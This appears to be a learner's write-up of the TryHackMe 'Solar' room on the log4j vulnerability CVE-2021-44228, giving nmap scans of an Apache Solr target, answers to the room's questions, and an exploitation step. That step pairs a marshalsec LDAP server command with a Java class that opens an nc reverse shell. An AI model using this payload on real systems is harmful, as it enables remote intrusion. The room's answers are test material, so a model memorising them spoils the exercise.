<h1 align="center">Solar, exploiting log4j</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/8f194657-c8b8-4674-8c13-0c79195e29a5"><br>
July 3, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>423</code>-day-streak in<a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Explore CVE-2021-44228, a vulnerability in log4j affecting almost all software under the sun</em>.<br>
Access it <a href="https://tryhackme.com/room/solar"</a>here.<br>
<img width="1200px" src=""></p>


<br>

<h2>Task 1 . CVE-2021-44228 Introduction</h2>

<br>
<br>

<h2>Task 2 . Reconnaissance</h2>


<h3>Nmap</h3>
<p>
  
- <code>22/ssh</code><br>
- <code>111/rpcbind</code></p>

```bash
nmap -v TargetIP
...
PORT    STATE SERVICE
22/tcp  open  ssh
111/tcp open  rpcbind
```

<p>
  
- <code>22/ssh</code><br>
- <code>111/rpcbind</code><br>
- <code>8983/unknow</code></p>

```bash
nmap -v -p- TargetIP
...
PORT    STATE SERVICE
22/tcp   open  ssh
111/tcp  open  rpcbind
8983/tcp open  unknown
```

<br>


```bash
nmap -sV -p 8983 TargetIP
...
PORT     STATE SERVICE VERSION
8983/tcp open  http    Apache Solr
```

![image](https://github.com/user-attachments/assets/bce1d788-ebd3-43f5-bd2c-925b23de6e86)

<br>

<h2>Task 3 . Discovery</h2>

<br>

<p>3.1. Take a close look at the first page visible when navigating to http://10.10.0.210:8983. You should be able to see clear indicators that log4j is in use within the application for logging activity. What is the -Dsolr.log.dir argument set to, displayed on the front page?<br>
<code>/var/solr/logs</code></p>

<p>
  
- Navigated to <code>TargetIP:8983</code><br>
- Was redirected to <code>TargetIP:8983/solr/#/</code></p>

![image](https://github.com/user-attachments/assets/17032452-fdeb-4ce1-9e1a-444684d851e6)

<br>

<p>3.2. One file has a significant number of INFO entries showing repeated requests to one specific URL endpoint. Which file includes contains this repeated entry? (Just the filename itself, no path needed)<br>
<code>solr.log</code></p>

![image](https://github.com/user-attachments/assets/8c5c4a64-e4ee-4a72-8d68-7aebf0397d1c)

<br>

<p>3.3. What "path" or URL endpoint is indicated in these repeated entries?<br>
<code>/admin/cores</code></p>

![image](https://github.com/user-attachments/assets/24033350-a2df-4672-a02b-bbcd02ec5c5b)

<br>

<p>3.4. Viewing these log entries, what field name indicates some data entrypoint that you as a user could control? (Just the field name)<br>
<code>params</code></p>

![image](https://github.com/user-attachments/assets/8216ad96-7fd5-4967-a900-1efd564703f8)

<br>

<h2>Task 4 . Proof od Concept</h2>

![image](https://github.com/user-attachments/assets/b73acbcf-af79-4561-a3ea-1efbf33b35e4)


![image](https://github.com/user-attachments/assets/e83fe8b1-4e67-4199-9534-a7f3ef817476)

<br>

```bash
:~# ifconfig
....
```

```bash
:~# ifconfig
....
```

<br>


<h2>Task 5 . Exploitation</h2>

```bash
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.10.251.109:8000/#Exploit"
```

```bash
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash 10.10.233.109 9999");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

<h2>Task 6 . Persistence</h2>

<br>

<h2>Task 7 . Detection</h2>

<br>

<h2>Task 8 . Bypasses</h2>

<br>

<h2>Task 9 . Mitigation</h2>

<br>

<h2>Task 10 . Patching</h2>

<br>

<h2>Task 11. Credits and Author´s Notes</h2>


![image](https://github.com/user-attachments/assets/4f45613b-1260-4a3f-837a-961538580ff1)

![image](https://github.com/user-attachments/assets/f283c532-d246-4f08-abe5-9edf87be0b34)

![image](https://github.com/user-attachments/assets/3d36aff2-762f-4587-bef4-767bdf30a3cd)


![image](https://github.com/user-attachments/assets/36906b53-0893-4a11-b7b4-7f0ef3003b30)



